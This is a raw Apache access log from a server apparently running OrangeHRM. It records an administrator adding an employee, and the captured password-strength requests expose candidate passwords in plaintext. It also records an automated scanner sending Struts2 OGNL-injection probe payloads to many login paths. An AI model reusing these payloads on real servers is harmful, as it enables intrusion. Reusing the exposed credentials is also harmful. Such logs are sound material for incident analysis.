74.118.138.195 - - [12/Jul/2018:15:31:13 -0700] "GET /symfony/web/index.php/dashboard HTTP/1.1" 200 47340 "http://74.118.139.108/symfony/web/index.php/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:31:14 -0700] "POST /login.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:31:14 -0700] "GET /symfony/web/index.php/dashboard/employeeDistribution HTTP/1.1" 200 1655 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:15 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmDashboardPlugin/js/flot/jquery.flot.min.js?_=1531434675112 HTTP/1.1" 200 52966 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:15 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmDashboardPlugin/js/flot/jquery.flot.pie.min.js?_=1531434675135 HTTP/1.1" 200 12183 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:15 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmDashboardPlugin/js/flot/JUMFlot.min.js?_=1531434675150 HTTP/1.1" 200 58050 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:15 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmDashboardPlugin/js/graph-visualizer/pie-chart.js?_=1531434675168 HTTP/1.1" 200 2814 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:14 -0700] "GET /symfony/web/index.php/dashboard/pendingLeaveRequests HTTP/1.1" 200 1232 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:31:20 -0700] "POST /index.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:26 -0700] "POST /index.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:31:27 -0700] "GET /symfony/web/index.php/pim/viewPimModule HTTP/1.1" 302 135 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:27 -0700] "GET /symfony/web/index.php/pim/viewEmployeeList HTTP/1.1" 200 52946 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:28 -0700] "GET /symfony/web/index.php/pim/getEmployeeListAjax HTTP/1.1" 200 32 "http://74.118.139.108/symfony/web/index.php/pim/viewEmployeeList" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:31 -0700] "GET /symfony/web/index.php/pim/addEmployee HTTP/1.1" 200 43276 "http://74.118.139.108/symfony/web/index.php/pim/viewEmployeeList" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:31 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmSecurityAuthenticationPlugin/css/passwordStrength.css HTTP/1.1" 200 621 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:31 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmSecurityAuthenticationPlugin/js/passwordStrengthMeterHelper.js HTTP/1.1" 200 1477 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:31:31 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmPimPlugin/js/addEmployeeSuccess.js HTTP/1.1" 200 3875 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:31:32 -0700] "POST /login.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:38 -0700] "POST /login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:45 -0700] "POST /main.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:52 -0700] "POST /default.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:59 -0700] "POST /register.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:07 -0700] "POST /login/login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:13 -0700] "POST /login/indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:20 -0700] "POST /indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:27 -0700] "GET /?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 302 - "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:34 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:32:37 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password= HTTP/1.1" 200 54 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:32:38 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:32:38 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:32:38 -0700] "GET /symfony/web/index.php/securityAuthentication/checkMinimumRequiredPasswordStrengthAjax?user_password=PSeXb%2B%24c%23sImgO%24H&password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 5 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:32:42 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:32:42 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:32:43 -0700] "GET /index.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:50 -0700] "GET /login.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:32:57 -0700] "GET /index.do?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:33:04 -0700] "GET /index.jsp?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:33:11 -0700] "GET /login.do?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:33:18 -0700] "GET /login.jsp?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:33:25 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:33:26 -0700] "GET /main.jsp?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:33:25 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:33:25 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=PSeXb%2B%24c%23sImgO%24H HTTP/1.1" 200 180 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:33:27 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=bZs-BHE8bA_8zEEB HTTP/1.1" 200 55 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:33:27 -0700] "GET /symfony/web/index.php/securityAuthentication/checkMinimumRequiredPasswordStrengthAjax?user_password=bZs-BHE8bA_8zEEB&password=bZs-BHE8bA_8zEEB HTTP/1.1" 200 4 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:33:27 -0700] "GET /symfony/web/index.php/securityAuthentication/getPasswordStrengthAjax?password=bZs-BHE8bA_8zEEB HTTP/1.1" 200 55 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:33:33 -0700] "GET /default.jsp?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:33:40 -0700] "GET /register.jsp?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:33:47 -0700] "GET /login/login.jsp?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:33:55 -0700] "GET /login/indexAction.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:34:03 -0700] "GET /indexAction.action?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:34:35 -0700] "POST /symfony/web/index.php/pim/addEmployee HTTP/1.1" 302 43502 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:34:37 -0700] "GET /symfony/web/index.php/pim/viewPersonalDetails/empNumber/0002 HTTP/1.1" 200 66603 "http://74.118.139.108/symfony/web/index.php/pim/addEmployee" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:34:38 -0700] "GET /symfony/web/index.php/pim/viewPhoto/empNumber/0002 HTTP/1.1" 200 94576 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/0002" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:34:38 -0700] "GET /symfony/web/index.php/leave/getWorkWeekAjax?_=1531434878103 HTTP/1.1" 200 17 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/0002" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:34:38 -0700] "GET /symfony/web/index.php/leave/getHolidayAjax?year=2018&_=1531434878102 HTTP/1.1" 200 2 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/0002" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
31.184.194.109 - - [12/Jul/2018:15:36:02 -0700] "GET / HTTP/1.0" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
74.118.138.195 - - [12/Jul/2018:15:37:28 -0700] "POST /symfony/web/index.php/pim/viewPersonalDetails HTTP/1.1" 302 150 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/0002" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:37:28 -0700] "GET /symfony/web/index.php/pim/viewPersonalDetails/empNumber/2 HTTP/1.1" 200 66915 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/0002" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:37:29 -0700] "GET /symfony/web/index.php/pim/viewPhoto/empNumber/2 HTTP/1.1" 200 94576 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:37:29 -0700] "GET /symfony/web/index.php/leave/getHolidayAjax?year=2018&_=1531435049650 HTTP/1.1" 200 2 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:37:29 -0700] "GET /symfony/web/index.php/leave/getWorkWeekAjax?_=1531435049651 HTTP/1.1" 200 17 "http://74.118.139.108/symfony/web/index.php/pim/viewPersonalDetails/empNumber/2" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
31.184.194.109 - - [12/Jul/2018:16:40:20 -0700] "GET / HTTP/1.0" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
5.35.135.66 - - [12/Jul/2018:17:03:59 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
189.68.187.86 - - [12/Jul/2018:17:58:16 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
211.20.153.39 - - [12/Jul/2018:17:59:57 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
189.38.160.228 - - [12/Jul/2018:18:46:33 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
52.3.250.176 - - [12/Jul/2018:19:24:38 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/59.0.3069.81 Safari/537.32"
52.3.250.176 - - [12/Jul/2018:19:24:38 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/59.0.3069.81 Safari/537.32"
179.110.73.91 - - [12/Jul/2018:19:40:56 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.249.181.130 - - [12/Jul/2018:19:45:12 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
159.203.196.79 - - [12/Jul/2018:19:45:12 -0700] "GET / HTTP/1.1" 302 - "74.118.139.108" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0"
179.110.18.211 - - [12/Jul/2018:19:48:37 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
36.65.183.236 - - [12/Jul/2018:21:11:48 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.97.145.84 - - [12/Jul/2018:22:02:21 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
179.97.145.84 - - [12/Jul/2018:22:02:21 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
118.190.74.19 - - [12/Jul/2018:22:38:52 -0700] "HEAD / HTTP/1.1" 302 - "-" "-"
189.78.163.128 - - [12/Jul/2018:22:39:28 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
200.25.240.27 - - [12/Jul/2018:22:50:37 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
150.242.255.108 - - [12/Jul/2018:23:44:14 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
47.41.203.241 - - [12/Jul/2018:23:50:37 -0700] "GET / HTTP/1.0" 302 - "-" "-"
95.180.176.224 - - [13/Jul/2018:00:09:12 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
31.184.194.109 - - [13/Jul/2018:00:53:58 -0700] "GET / HTTP/1.0" 302 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
